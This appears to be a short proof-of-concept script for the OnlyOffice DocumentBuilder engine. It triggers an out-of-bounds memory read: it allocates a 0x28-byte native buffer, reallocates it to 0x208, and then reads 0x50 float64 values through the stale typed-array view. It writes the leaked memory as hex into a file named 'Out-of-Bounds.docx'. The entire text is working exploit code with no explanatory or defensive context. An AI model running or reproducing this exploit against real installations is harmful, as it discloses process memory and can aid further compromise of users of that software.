builder.CreateFile("docx");

var oDoc = Api.GetDocument();
var oPar = oDoc.GetElement(0);

var _buf = new ArrayBuffer(8);
var _f64_buf = new Float64Array(_buf);
var _u64_buf = new BigUint64Array(_buf);

function f64_hex(val) { // typeof(val) = float
  _f64_buf[0] = val;
  return _u64_buf[0].toString(16);
}

engine = CreateNativeEngine();

var native_array = engine.Save_AllocNative(0x28);
var f64_native_array = new Float64Array(native_array.buffer);
engine.Save_ReAllocNative(0x208, 0x208);
for (var i = 0; i < 0x50; i++) {
    console.log("0x"+f64_hex(f64_native_array[i]));
    oPar.AddText("0x"+f64_hex(f64_native_array[i]));
    oPar.AddLineBreak();
}

builder.SaveFile("docx", "Out-of-Bounds.docx");
builder.CloseFile();
    